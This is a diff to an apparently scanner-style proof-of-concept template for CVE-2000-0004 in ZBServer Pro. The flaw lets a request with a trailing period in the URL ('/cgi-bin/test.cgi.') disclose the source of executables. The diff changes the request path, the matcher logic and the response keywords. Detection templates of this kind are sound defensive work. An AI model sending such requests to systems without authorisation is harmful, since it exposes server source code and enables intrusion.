@@ -1,21 +1,25 @@
 [info]
 author = "AVE"
-description = "检测 ZBServer Pro 是否在请求 URL 末尾添加句点（.）后泄露可执行文件源代码"
+description = "ZBServer Pro 存在源代码泄露漏洞，通过在 URL 中插入点号（.）可读取可执行文件源码"
 id = "POC-AVE-2000-0006"
 name = "ZBServer Pro Source Code Disclosure PoC"
 severity = "medium"
-tags = ["cve-2000-0004"]
+tags = [
+    "cve-2000-0004",
+    "zbserver",
+    "source-code-disclosure",
+]
 vuln_id = [
     "CVE-2000-0004",
     "AVE-2000-0006",
 ]
 
 [poc]
-logic = "all"
+logic = "any"
 
 [[poc.requests]]
 method = "GET"
-path = "/{{BaseURL}}/{{Path}}."
+path = "/{{BaseURL}}/cgi-bin/test.cgi."
 protocol = "http"
 
 [[poc.requests.matchers]]
@@ -23,8 +27,7 @@ expect = true
 part = "body"
 type = "word"
 words = [
-    "<%",
-    "<?php",
-    "Response.Write",
-    "Server.CreateObject",
+    "#!/usr/bin",
+    "Content-Type",
+    "print",
 ]
